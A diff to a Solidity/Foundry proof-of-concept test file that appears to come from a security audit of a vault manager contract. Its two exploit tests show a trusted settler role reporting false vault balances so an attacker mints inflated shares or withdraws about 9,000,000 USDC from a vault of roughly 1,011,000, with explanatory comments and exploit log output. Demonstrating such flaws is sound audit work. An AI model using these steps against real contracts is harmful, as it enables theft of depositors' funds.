@@ -185,8 +185,6 @@ contract VaultManagerHarness is ITypes {
     bytes32 public rollingWithdrawalHash;
     uint256 public currentBatchId;
     uint256 public batchStartTime;
-    // Global inflight counter. _resetBatch must NOT zero this;
-    // only bulkSettle decrements it as requests are processed.
     uint256 public pendingCount;
 
     mapping(uint256 => uint32)      public batchFinalizedAt;
@@ -441,7 +439,6 @@ contract FundDrainPoCTest is Test, ITypes {
         );
         uint16[]  memory it = new uint16[](1);  it[0] = TID;
         uint256[] memory ia = new uint256[](1); ia[0] = 1000e6;
-        // Executor (vault) starts with 1,000,000 USDC; PROPOSER gets 2,000e18 seed shares.
         portfolio.setBalance(address(executor), SYM, 1_000_000e6);
         manager.registerVault(VID, vd, it, ia, 2000e18);
         vm.stopPrank();
@@ -451,97 +448,98 @@ contract FundDrainPoCTest is Test, ITypes {
     }
 
     // =========================================================================
-    // STEAL-01: SETTLER reports falsely low vault balance -> attacker mints
-    //           a disproportionate share of the vault.
+    // STEAL-01: SETTLER reports falsely low vault balance on attacker's batch
+    //           -> attacker mints shares equal to entire existing totalSupply
+    //           -> attacker holds ~50% of vault with only 1 USDC invested.
     // =========================================================================
-    // Root cause: share minting formula is:
-    //   shares = (deposit_usd * totalSupply) / totalUsd_in_vault
+    // Root cause:
+    //   shares_minted = (deposit_usd * totalSupply) / totalUsd_in_vault
+    //   totalUsd_in_vault is provided off-chain by SETTLER with no on-chain
+    //   verification against actual executor balances.
     //
-    // totalUsd is supplied entirely by the (off-chain) SETTLER with no on-chain
-    // verification against the actual executor portfolio balance.
-    //
-    // Attack:
-    //   Batch 0 - Alice deposits 10,000 USDC; SETTLER settles honestly.
-    //             Vault real balance = 1,010,000 USDC.  totalSupply grows.
+    // Attack (3 batches):
+    //   Batch 0 - Alice deposits 10,000 USDC, settled honestly.
+    //             Vault balance = 1,010,000 USDC, totalSupply grows to ~2,020 shares.
     //   Batch 1 - Attacker deposits 1 USDC.
-    //             SETTLER lies: reports vault_balance = 1 USDC (hides the other
-    //             1,010,000 USDC already in the executor).
-    //             -> totalUsd = 1  (tiny denominator)
-    //             -> attacker_shares = (1 * totalSupply) / 1 = totalSupply
-    //             -> attacker instantly holds ~50% of the vault.
-    //   Batch 2 - Attacker withdraws and drains ~505,000 USDC from a 1 USDC stake.
+    //             SETTLER lies vault_balance = 1 USDC (hides the 1,010,000 real).
+    //             totalUsd = 1e6 -> attacker_shares = (1e6 * totalSupply) / 1e6
+    //                             = totalSupply  (attacker doubles the supply!)
+    //             Attacker now holds ~50% of vault.
+    //   Batch 2 - Attacker withdraws, receives ~505,000 USDC.
     function testSTEAL01_FakeVaultBalanceDrainsVault() public {
         console.log("\n=== STEAL-01: Fake Vault Balance -> Share Inflation ===");
+        _s01_batch0_aliceDeposit();
+        _s01_batch1_attackerDeposit();
+        _s01_batch2_attackerWithdraw();
+    }
 
-        // --- Batch 0: Alice deposits 10,000 USDC (honest settlement) ---
+    function _s01_batch0_aliceDeposit() internal {
         uint16[]  memory tids = new uint16[](1); tids[0] = TID;
-        uint256[] memory amts = new uint256[](1);
-
-        amts[0] = 10_000e6;
+        uint256[] memory amts = new uint256[](1); amts[0] = 10_000e6;
         vm.prank(ALICE);
         bytes32 aliceReq = manager.requestDeposit(VID, tids, amts);
         console.log("[+] Alice deposited: 10,000 USDC");
 
-        // Honest finalize: real vault balance = 1,010,000 USDC (1M seed + 10K Alice)
         uint16[]  memory vtids = new uint16[](1); vtids[0] = TID;
         uint256[] memory vbals = new uint256[](1); vbals[0] = 1_010_000e6;
-        uint256[] memory pr0   = new uint256[](1); pr0[0]   = PRICE_1;
-        VaultState[] memory vs0 = new VaultState[](1);
-        vs0[0] = VaultState(VID, vtids, vbals);
-        vm.prank(SETTLER); manager.finalizeBatch(pr0, vs0);
+        uint256[] memory pr    = new uint256[](1); pr[0]    = PRICE_1;
+        VaultState[] memory vs = new VaultState[](1);
+        vs[0] = VaultState(VID, vtids, vbals);
+        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
 
-        DepositFufillment[] memory deps0 = new DepositFufillment[](1);
-        uint16[]  memory t0 = new uint16[](1); t0[0] = TID;
-        uint256[] memory a0 = new uint256[](1); a0[0] = 10_000e6;
-        deps0[0] = DepositFufillment(aliceReq, true, t0, a0);
-        vm.prank(SETTLER); manager.bulkSettle(pr0, vs0, deps0, new WithdrawalFufillment[](0));
-        console.log("[+] Batch 0 settled honestly. totalSupply:", share.totalSupply() / 1e18, "shares");
+        DepositFufillment[] memory deps = new DepositFufillment[](1);
+        uint16[]  memory dt = new uint16[](1); dt[0] = TID;
+        uint256[] memory da = new uint256[](1); da[0] = 10_000e6;
+        deps[0] = DepositFufillment(aliceReq, true, dt, da);
+        vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));
+        console.log("[+] Batch 0 settled. totalSupply:", share.totalSupply() / 1e18, "shares");
+    }
 
-        // --- Batch 1: Attacker deposits 1 USDC; SETTLER lies vault_balance = 1 USDC ---
+    function _s01_batch1_attackerDeposit() internal {
+        uint16[]  memory tids = new uint16[](1); tids[0] = TID;
+        uint256[] memory amts = new uint256[](1); amts[0] = 1e6;
         portfolio.setBalance(ATTACKER, SYM, 1e6);
-        amts[0] = 1e6;
         vm.prank(ATTACKER);
         bytes32 atkReq = manager.requestDeposit(VID, tids, amts);
         console.log("[+] Attacker deposited: 1 USDC");
 
-        // SETTLER lies: vault balance = 1 USDC (hides 1,010,001 USDC)
-        // -> totalUsd = 1e6 * 1e18 / 1e18 = 1e6
-        // -> attacker shares = (1e6 * totalSupply) / 1e6 = totalSupply  (doubles supply!)
-        uint256[] memory fakeBals1 = new uint256[](1); fakeBals1[0] = 1e6; // FAKE: 1 USDC
-        uint256[] memory pr1       = new uint256[](1); pr1[0]       = PRICE_1;
-        VaultState[] memory vs1    = new VaultState[](1);
-        vs1[0] = VaultState(VID, vtids, fakeBals1);
-        vm.prank(SETTLER); manager.finalizeBatch(pr1, vs1);
-        console.log("[EXPLOIT] SETTLER finalized batch 1 with FAKE vault balance: 1 USDC");
+        // SETTLER lies: vault_balance = 1 USDC (real = 1,010,001 USDC)
+        // -> totalUsd = 1e6 -> shares = (1e6 * totalSupply) / 1e6 = totalSupply
+        uint16[]  memory vtids    = new uint16[](1); vtids[0]    = TID;
+        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 1e6;
+        uint256[] memory pr       = new uint256[](1); pr[0]       = PRICE_1;
+        VaultState[] memory vs    = new VaultState[](1);
+        vs[0] = VaultState(VID, vtids, fakeBals);
+        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
+        console.log("[EXPLOIT] SETTLER finalized with FAKE vault balance: 1 USDC");
 
-        DepositFufillment[] memory deps1 = new DepositFufillment[](1);
-        uint16[]  memory t1 = new uint16[](1); t1[0] = TID;
-        uint256[] memory a1 = new uint256[](1); a1[0] = 1e6;
-        deps1[0] = DepositFufillment(atkReq, true, t1, a1);
-        vm.prank(SETTLER); manager.bulkSettle(pr1, vs1, deps1, new WithdrawalFufillment[](0));
+        DepositFufillment[] memory deps = new DepositFufillment[](1);
+        uint16[]  memory dt = new uint16[](1); dt[0] = TID;
+        uint256[] memory da = new uint256[](1); da[0] = 1e6;
+        deps[0] = DepositFufillment(atkReq, true, dt, da);
+        vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));
 
-        uint256 atkShares   = share.balanceOf(ATTACKER);
-        uint256 totalSupply = share.totalSupply();
-        uint256 atkPct      = (atkShares * 100) / totalSupply;
-        console.log("[EXPLOIT] Attacker shares:", atkShares / 1e18, "| totalSupply:", totalSupply / 1e18);
-        console.log("[EXPLOIT] Attacker owns", atkPct, "% of vault (deposited only 1 USDC)");
+        uint256 atkS = share.balanceOf(ATTACKER);
+        uint256 ts   = share.totalSupply();
+        console.log("[EXPLOIT] Attacker shares:", atkS / 1e18, "| totalSupply:", ts / 1e18);
+        console.log("[EXPLOIT] Attacker owns", (atkS * 100) / ts, "% of vault");
+    }
 
-        // --- Batch 2: Attacker withdraws, draining ~50% of 1,010,001 USDC ---
-        vm.prank(ATTACKER);
-        share.approve(address(manager), atkShares);
-        vm.prank(ATTACKER);
-        manager.requestWithdrawal(VID, uint208(atkShares));
+    function _s01_batch2_attackerWithdraw() internal {
+        uint256 atkShares = share.balanceOf(ATTACKER);
+        vm.prank(ATTACKER); share.approve(address(manager), atkShares);
+        vm.prank(ATTACKER); manager.requestWithdrawal(VID, uint208(atkShares));
 
-        // Honest withdrawal settlement (real balance)
-        uint256[] memory realBals2 = new uint256[](1); realBals2[0] = 1_010_001e6;
-        uint256[] memory pr2       = new uint256[](1); pr2[0]       = PRICE_1;
-        VaultState[] memory vs2    = new VaultState[](1);
-        vs2[0] = VaultState(VID, vtids, realBals2);
-        vm.prank(SETTLER); manager.finalizeBatch(pr2, vs2);
+        uint16[]  memory vtids    = new uint16[](1); vtids[0]    = TID;
+        uint256[] memory realBals = new uint256[](1); realBals[0] = 1_010_001e6;
+        uint256[] memory pr       = new uint256[](1); pr[0]       = PRICE_1;
+        VaultState[] memory vs    = new VaultState[](1);
+        vs[0] = VaultState(VID, vtids, realBals);
+        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
 
-        WithdrawalFufillment[] memory wds2 = new WithdrawalFufillment[](1);
-        wds2[0] = WithdrawalFufillment(_rid(ATTACKER, VID, 1), true);
-        vm.prank(SETTLER); manager.bulkSettle(pr2, vs2, new DepositFufillment[](0), wds2);
+        WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
+        wds[0] = WithdrawalFufillment(_rid(ATTACKER, VID, 1), true);
+        vm.prank(SETTLER); manager.bulkSettle(pr, vs, new DepositFufillment[](0), wds);
 
         uint256 stolen = portfolio.balances(ATTACKER, SYM);
         console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC (invested only 1 USDC)");
@@ -551,25 +549,27 @@ contract FundDrainPoCTest is Test, ITypes {
 
     // =========================================================================
     // STEAL-02: SETTLER inflates vault balance in withdrawal batch
-    //           -> attacker receives far more tokens than proportional share.
+    //           -> attacker withdraws far more than their proportional share.
     // =========================================================================
-    // Root cause: withdrawal payout formula:
-    //   payout = shares * vault_balance / totalSupply
+    // Root cause:
+    //   payout = req.shares * vault_balance / totalSupply
+    //   vault_balance is supplied by SETTLER with no on-chain verification.
     //
-    // vault_balance at withdrawal time comes from SETTLER with no on-chain check.
-    //
-    // Attack:
-    //   Batch 0 - Attacker + Alice deposit at fair prices.
-    //             Attacker holds ~9% of vault shares.
+    // Attack (2 batches):
+    //   Batch 0 - Attacker deposits 1,000 USDC, Alice deposits 10,000 USDC (honest).
+    //             Attacker holds ~9% of vault.
     //   Batch 1 - Attacker requests withdrawal.
-    //             SETTLER lies: vault_balance = 100,000,000 USDC (100x real).
-    //             -> payout = attacker_shares * 100M / totalSupply
-    //             -> attacker receives 9% of 100M = 9,000,000 USDC
-    //             -> real vault only has ~1,011,000 USDC -> massive overdraft.
+    //             SETTLER lies vault_balance = 100,000,000 USDC (real ~1,011,000).
+    //             payout = attacker_shares * 100M / totalSupply
+    //                    = ~9% * 100M = ~9,000,000 USDC
+    //             executor only has 1,011,000 USDC -> massive overdraft.
     function testSTEAL02_InflatedWithdrawalBalanceDrainsVault() public {
         console.log("\n=== STEAL-02: Inflated Withdrawal Balance Attack ===");
+        _s02_batch0_deposits();
+        _s02_batch1_fakeWithdraw();
+    }
 
-        // --- Batch 0: Attacker (1,000 USDC) + Alice (10,000 USDC) deposit ---
+    function _s02_batch0_deposits() internal {
         uint16[]  memory tids  = new uint16[](1); tids[0]  = TID;
         uint16[]  memory vtids = new uint16[](1); vtids[0] = TID;
         uint256[] memory amts  = new uint256[](1);
@@ -583,12 +583,11 @@ contract FundDrainPoCTest is Test, ITypes {
         vm.prank(ALICE);
         bytes32 aliceReq = manager.requestDeposit(VID, tids, amts);
 
-        // Honest settlement for deposit batch
-        uint256[] memory pr0  = new uint256[](1); pr0[0]  = PRICE_1;
-        uint256[] memory vb0  = new uint256[](1); vb0[0]  = 1_011_000e6;
-        VaultState[] memory vs0 = new VaultState[](1);
-        vs0[0] = VaultState(VID, vtids, vb0);
-        vm.prank(SETTLER); manager.finalizeBatch(pr0, vs0);
+        uint256[] memory pr = new uint256[](1); pr[0] = PRICE_1;
+        uint256[] memory vb = new uint256[](1); vb[0] = 1_011_000e6;
+        VaultState[] memory vs = new VaultState[](1);
+        vs[0] = VaultState(VID, vtids, vb);
+        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
 
         DepositFufillment[] memory deps = new DepositFufillment[](2);
         uint16[]  memory ta = new uint16[](1); ta[0] = TID;
@@ -597,34 +596,32 @@ contract FundDrainPoCTest is Test, ITypes {
         uint256[] memory ab = new uint256[](1); ab[0] = 10_000e6;
         deps[0] = DepositFufillment(atkReq,   true, ta, aa);
         deps[1] = DepositFufillment(aliceReq, true, tb, ab);
-        vm.prank(SETTLER); manager.bulkSettle(pr0, vs0, deps, new WithdrawalFufillment[](0));
+        vm.prank(SETTLER); manager.bulkSettle(pr, vs, deps, new WithdrawalFufillment[](0));
 
+        uint256 atkS = share.balanceOf(ATTACKER);
+        console.log("[+] Attacker legitimately owns", (atkS * 100) / share.totalSupply(), "% of vault");
+    }
+
+    function _s02_batch1_fakeWithdraw() internal {
         uint256 atkShares = share.balanceOf(ATTACKER);
-        uint256 ts0       = share.totalSupply();
-        console.log("[+] Attacker legitimately owns", (atkShares * 100) / ts0, "% of vault");
+        vm.prank(ATTACKER); share.approve(address(manager), atkShares);
+        vm.prank(ATTACKER); manager.requestWithdrawal(VID, uint208(atkShares));
 
-        // --- Batch 1: Attacker requests withdrawal; SETTLER inflates balance 100x ---
-        vm.prank(ATTACKER);
-        share.approve(address(manager), atkShares);
-        vm.prank(ATTACKER);
-        manager.requestWithdrawal(VID, uint208(atkShares));
-
-        // SETTLER lies: vault balance = 100,000,000 USDC (real is ~1,011,000 USDC)
-        uint256[] memory pr1      = new uint256[](1); pr1[0]      = PRICE_1;
-        uint256[] memory fakeBal1 = new uint256[](1); fakeBal1[0] = 100_000_000e6; // FAKE 100x
-        VaultState[] memory vs1   = new VaultState[](1);
-        vs1[0] = VaultState(VID, vtids, fakeBal1);
-        vm.prank(SETTLER); manager.finalizeBatch(pr1, vs1);
+        uint16[]  memory vtids    = new uint16[](1); vtids[0]    = TID;
+        uint256[] memory fakeBals = new uint256[](1); fakeBals[0] = 100_000_000e6;
+        uint256[] memory pr       = new uint256[](1); pr[0]       = PRICE_1;
+        VaultState[] memory vs    = new VaultState[](1);
+        vs[0] = VaultState(VID, vtids, fakeBals);
+        vm.prank(SETTLER); manager.finalizeBatch(pr, vs);
         console.log("[EXPLOIT] SETTLER finalized with FAKE vault balance: 100,000,000 USDC");
 
         WithdrawalFufillment[] memory wds = new WithdrawalFufillment[](1);
         wds[0] = WithdrawalFufillment(_rid(ATTACKER, VID, 1), true);
-        vm.prank(SETTLER); manager.bulkSettle(pr1, vs1, new DepositFufillment[](0), wds);
+        vm.prank(SETTLER); manager.bulkSettle(pr, vs, new DepositFufillment[](0), wds);
 
         uint256 stolen = portfolio.balances(ATTACKER, SYM);
         console.log("[EXPLOIT] Attacker invested:  1,000 USDC");
         console.log("[EXPLOIT] Attacker received:", stolen / 1e6, "USDC");
-        // 9% of 100,000,000 = 9,000,000 USDC >> real vault of 1,011,000 USDC
         assertGt(stolen, 1_000_000e6, "STEAL-02: must drain >> 1,000,000 USDC");
         console.log("[EXPLOIT] STEAL-02 CONFIRMED");
     }
@@ -640,7 +637,6 @@ contract FundDrainPoCTest is Test, ITypes {
 
         uint256[] memory swapIds = new uint256[](1); swapIds[0] = 1;
         uint256[] memory fees    = new uint256[](1); fees[0]    = execBal;
-
         vm.prank(TRADER);
         executor.collectSwapFees(SYM, swapIds, fees);
 
